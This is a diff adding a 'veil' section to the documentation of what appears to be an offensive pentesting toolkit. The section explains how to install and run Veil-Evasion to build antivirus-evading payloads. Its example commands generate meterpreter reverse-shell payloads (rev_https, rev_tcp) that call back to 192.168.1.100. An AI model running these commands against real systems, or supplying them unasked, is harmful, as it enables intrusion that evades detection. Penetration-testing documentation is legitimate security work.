@@ -5174,6 +5174,26 @@ be the most secure or efficient method for production code. Consider using
 a library like `requests` for HTTP operations if security and efficiency
 are concerns.
 
+## veil
+Generates payloads using Veil-Evasion with various options. Veil-Evasion is a payload creation framework
+for generating payloads that evade antivirus detection. This function checks if `Veil-Evasion` is installed
+and installs it if necessary. It then runs `Veil-Evasion` with the specified parameters to create various payloads.
+
+:param line: Not used in this implementation but reserved for future use.
+
+:returns: None
+
+Manual execution:
+To manually generate a payload using Veil-Evasion, use the following command:
+    ./Veil-Evasion.py -p <PAYLOAD> --<OPTION> <VALUE>
+
+Replace the placeholders with the desired values. For example:
+    ./Veil-Evasion.py -p python/meterpreter/rev_https LHOST=192.168.1.100 LPORT=443
+
+Example usage:
+    veil python_meterpreter_rev_https LHOST=192.168.1.100 LPORT=443
+    veil ruby_meterpreter_rev_tcp LHOST=192.168.1.100 LPORT=4444
+
 ## find_tgts
 Finds and returns a list of target hosts with port 445 open in the specified subnet.
 
